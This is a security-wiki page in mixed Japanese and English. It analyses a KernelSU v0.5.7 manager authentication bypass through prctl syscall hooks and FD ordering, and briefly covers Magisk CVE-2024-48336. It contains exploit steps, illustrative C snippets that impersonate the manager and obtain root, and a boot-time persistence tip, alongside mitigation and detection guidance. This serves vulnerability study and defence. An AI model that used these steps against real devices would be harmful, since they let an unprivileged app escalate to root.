# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRootなどのRooting frameworksは、Android/Linux kernelにpatchまたはhookを施し、権限のないuserspace manager appに特権機能を公開します。Magiskについては以下で個別に説明します。これはCVE-2024-48336がKernelSUのsyscall pathではなく、manager側のcode loadingに関係していたためです。<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

このページでは、公開研究（特にZimperiumによるKernelSU v0.5.7の分析）で明らかになったtechniquesと問題点を抽象化し、red teamとblue teamの双方がattack surface、exploit primitives、堅牢なmitigationsを理解できるようにします。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7では、kernel hookが`prctl`でmagic value、command ID、userspaceからのcommand固有のargumentsを受け取ります。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- callerはまず`CMD_BECOME_MANAGER`でmanager statusを要求します。Authorizationはcommandごとに異なり、`CMD_GRANT_ROOT`はmanager/allowlist stateを確認し、`CMD_ALLOW_SU`はmanager専用、`CMD_SET_SEPOLICY`はこのversionではroot専用です。<sup>[[2]](#references)[[11]](#references)</sup>
- その他のcommandsはversion/configurationを照会するか、framework eventsを報告します。<sup>[[2]](#references)</sup>
- どのappでもこのsyscall interfaceを呼び出せるため、manager authenticationの正確性がcriticalです。<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handlerへredirectするためのmagic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspaceがprctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)を呼び出すと、KernelSUは以下を確認します。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- 指定されたpathは、caller UIDに対応する想定prefixで始まる必要があります。例：/data/data/<pkg>または/data/user/<id>/<pkg>。
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- pathはcaller UIDが所有している必要があります。
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- calling processのopen file descriptorsを、descriptor orderの昇順でiterateします。
- regular fileごとに、そのpathが`/data/app/`で始まり`/base.apk`で終わる場合、pathに指定されたdata-directory pathから導出されたpackage substringが含まれていることを要求します。
- これらのpath checksを最初に通過したcandidateのsignatureをverifyします。
- APK v2 signatureをparseし、official manager certificateに対してverifyします。
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

すべてのchecksに通過すると、kernelはmanagerのUIDを一時的にcacheします。その後、manager-only commandsはそのUIDを受け入れますが、その他のcommandsはそれぞれのUIDまたはallowlist checksを維持します。<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7はsignature resultをPackageManagerのinstalled package identityにbindしていません。`manager.c`では、package testはpath substring check（`strstr(cwd, pkg)`）に過ぎず、そのtestを通過した最初のcandidateがsignature-checkされます。したがってattackerは、attackerのpackage nameも含む`/data/app/` pathの下にgenuine manager APKを配置し、それが最初に選択されるようにすることができます。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

このtrust-by-indirectionにより、unprivileged appはmanagerのsigning keyを所有せずにmanagerをimpersonateできます。<sup>[[1]](#references)</sup>

Exploitedされる主なproperties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scanはdescriptor index順で行われ、package checkはpath substring testであり、verified package-to-APK identity bindingではありません。
- open()は利用可能な最も小さいFDを返します。先に小さい番号のFDをcloseすることで、attackerはorderingを制御できます。
- bundled manager APKは、official manager signatureを保持したまま、attackerのpackage stringを含む`/data/app/`下のpathに配置できます。

---
## Attack preconditions

具体的なKernelSU v0.5.7 caseには以下が必要です。<sup>[[1]](#references)[[3]](#references)</sup>

- deviceがすでにvulnerable rooting framework（例：KernelSU v0.5.7）でrootedされていること。
- attackerがlocalで任意のunprivileged code（Android app process）を実行できること。
- v0.5.7 implementationでは、`current->real_parent`のUIDが0である必要があります（source commentではこれをzygote direct-child requirementと説明しています）。`manager.c`はその他のparentsをrejectします。<sup>[[3]](#references)</sup>
- real managerがまだauthenticatedされていないこと（例：reboot直後）。一部のframeworksはsuccess後にmanager UIDをcacheするため、raceに勝つ必要があります。<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps（引用されたdemo videoでは、public proof of conceptの動作が示されています）：<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) prefixとownership checksを満たすため、自分のapp data directoryへのvalid pathを構築します。
2) genuine KernelSU Manager base.apkを、package stringを含む`/data/app/`下のpathに配置し、自分のbase.apkより小さい番号のFDでopenします。
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)をinvokeしてchecksを通過します。
4) `CMD_GRANT_ROOT`を使用し、その後persistent suのために`CMD_ALLOW_SU`を使用します。rootを取得した後、かつ対応している場合に限り、root-onlyの`CMD_SET_SEPOLICY`をinvokeします。

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlinksをwalkして、自分の`/data/app/*/base.apk`に対応するprocessのFDを特定します。
- low FD（例：stdin、fd 0）をcloseし、legitimate manager APKを先にopenしてfd 0（または自分のbase.apk fdより小さいindex）を占有させます。
- legitimate manager APKをappにbundleし、そのpathが`/data/app/`で始まり、`/base.apk`で終わり、package stringを含むようにします。例えば、appの`lib` directory下のpathでこれらのchecksを満たせます。<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
低い番号の FD が正規の manager APK を指すように強制する：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 の `prctl` hook による Manager authentication:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
成功後に実行可能な privileged commands（例）:<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: 現在のプロセスを root に昇格
- CMD_ALLOW_SU: 永続的な su の allowlist に自身の package/UID を追加
- CMD_SET_SEPOLICY: root 取得後に SELinux policy を調整；KernelSU v0.5.7 はこの command に対して UID 0 をチェックします。<sup>[[2]](#references)</sup>

Race/persistence tip:
- AndroidManifest（`RECEIVE_BOOT_COMPLETED`）に BOOT_COMPLETED receiver を登録して reboot 後に起動し、本来の manager より前に authentication を試行する；この permission は `ACTION_BOOT_COMPLETED` の受信を許可しますが、それ自体が scheduling priority を保証するものではありません。<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

framework developers 向け:
- authentication を任意の FD ではなく、caller の package/UID にバインドする:
- UID から caller の package を解決し、FD をスキャンするのではなく、PackageManager を介してインストール済み package の signature と照合する。
- kernel-only の場合は、安定した caller identity（task creds）を使用し、process FD ではなく、init/userspace helper が管理する安定した source of truth に対して検証する。
- identity として path-prefix checks を使用しない；caller によって簡単に満たされます。
- channel 上で nonce-based challenge–response を使用し、boot 時または key events 発生時に cached manager identity を消去する。
- 可能であれば、generic syscalls に機能を過剰搭載するのではなく、binder-based authenticated IPC の使用を検討する。

defenders/blue team 向け:
- rooting frameworks と manager processes の存在を検出する；kernel telemetry がある場合は、不審な magic constants（例: 0xDEADBEEF）を伴う prctl calls を監視する。<sup>[[1]](#references)[[11]](#references)</sup>
- managed fleets では、boot 後に privileged manager commands を迅速に試行する untrusted packages の boot receivers を block または alert 対象にする。
- devices が patched framework versions に更新されていることを確認する；update 時に cached manager IDs を無効化する。

attack の制限:<sup>[[1]](#references)[[2]](#references)</sup>
- 既に vulnerable framework で root 化されている devices のみに影響する。
- 通常、legitimate manager が authentication する前に reboot/race window が必要となる（一部の frameworks は reset まで manager UID を cache する）。

---
## Related notes across frameworks

- Password-based auth（例: historical APatch/SKRoot builds）は、password が推測または brute-force 可能である場合、あるいは validations に bug がある場合、weak になり得る。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth（例: KernelSU）は原理上 stronger だが、FD scans によって選択された path-derived artefacts ではなく、実際の caller にバインドする必要がある。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 は、未検証の GMS package から code を load していた pre-Canary 27007 builds に影響し、local app が user interaction なしで Magisk app 内の code を実行して root に escalate することを可能にした。<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – あらゆる悪の Rooting: Mobile Device を危険にさらす可能性のある Security Holes](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c の authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c の FD iteration、package check、signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c の APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS が system app であることの Verify](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h の command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
